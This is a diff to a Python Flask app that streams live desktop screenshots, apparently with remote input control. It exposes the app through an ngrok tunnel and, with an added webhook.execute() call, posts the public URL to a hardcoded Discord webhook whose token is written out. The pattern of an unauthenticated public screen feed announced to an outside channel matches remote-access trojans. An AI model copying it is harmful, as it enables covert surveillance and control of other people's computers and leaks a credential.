@@ -17,7 +17,7 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
 socketio = SocketIO(app)
 
-screenshot_path = "static/images/screenshot.png"
+screenshot_path = "screenshot.png"
 
 
 button_states = {
@@ -65,7 +65,6 @@ def continuous_action(button_id):
         time.sleep(0.25) 
 
 def take_screenshots():
-    screenshot_path = os.path.join(app.static_folder, 'images', 'screenshot.png')
     while True:
         screenshot = pyautogui.screenshot()
         x, y = pyautogui.position()
@@ -74,7 +73,7 @@ def take_screenshots():
         paste_position = (final_x, final_y)
         screenshot.paste(cursor_image, paste_position, cursor_image)
         screenshot.save(screenshot_path)
-        socketio.emit('update_image', {'src': '/static/images/screenshot.png'})
+        socketio.emit('update_image', {'src': 'screenshot.png'})
         time.sleep(0.25)
 
 @socketio.on('connect')
@@ -107,5 +106,6 @@ if __name__ == '__main__':
     public_url = ngrok.connect(5000)
     print(" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:5000:{}/\"".format(public_url, port))
     webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1277325619482591334/odNBwGAG9rfzNwPy2G2YDFlHusg_bfdKwhEvwnd79MdXspdGzg1b3wzZ1Bc2U9cmJiiq", content=" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:5000:{}/\"".format(public_url, port))
+    webhook.execute()
     socketio.run(app, debug=False)
     time.sleep(3)
